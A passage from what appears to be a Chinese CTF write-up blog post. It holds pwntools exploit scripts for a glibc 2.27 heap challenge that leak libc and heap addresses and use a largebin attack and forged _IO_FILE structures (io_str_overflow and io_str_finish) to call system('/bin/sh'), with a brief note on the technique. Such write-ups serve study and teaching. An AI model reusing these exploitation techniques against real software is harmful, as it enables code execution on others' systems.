process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    <span class="comment"># payload=&#x27;\x00&#x27;*0x10+p64(0)+p64(1)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(binsh_addr)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xa8-0x10,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(3)+p64(0)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xc8,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+0x3e8360-0x8)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    edit(<span class="number">19</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="io-str-finish"><a href="#io-str-finish" class="headerlink" title="io_str_finish"></a>io_str_finish</h4><p>除了io_str_overflow以外io_str_finish这个函数指针也可以使用，也是通过io_flush_all_lockp函数这个函数调用的，只要让vtable=io_str_jumps-,这个函数调用的是fp+0xe8,在对应位置填上system_addr就行。然后fp的伪造也比io_str_overflow简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+<span class="number">0x3e8360</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="comment"># pay = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2+1)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*12</span></span><br><span class="line">    <span class="comment"># pay+= p64(2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(3)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0xffffffff)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.address+0x3e8360)</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    edit(<span class="number">19</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/02/SUSCTF/" rel="prev" title="SUSCTF">
      <i class="fa fa-chevron-left"></i> SUSCTF
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/03/07/VNCTF-pwn1/" rel="next" title="VNCTF pwn1">
      VNCTF pwn1 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#vnctf"><span class="nav-number">1.</span> <span class="nav-text">vnctf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#clear-got"><span class="nav-number">1.1.</span> <span class="nav-text">clear_got</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop"><span class="nav-number">1.2.</span> <span class="nav-text">rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E5%A2%A9%E5%A2%A9"><span class="nav-number">1.3.</span> <span class="nav-text">冰墩墩</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-number">1.4.</span> <span class="nav-text">http</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%BE%E7%82%B9"><span class="nav-number">1.4.1.</span> <span class="nav-text">难点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FShuiMaster"><span class="nav-number">1.5.</span> <span 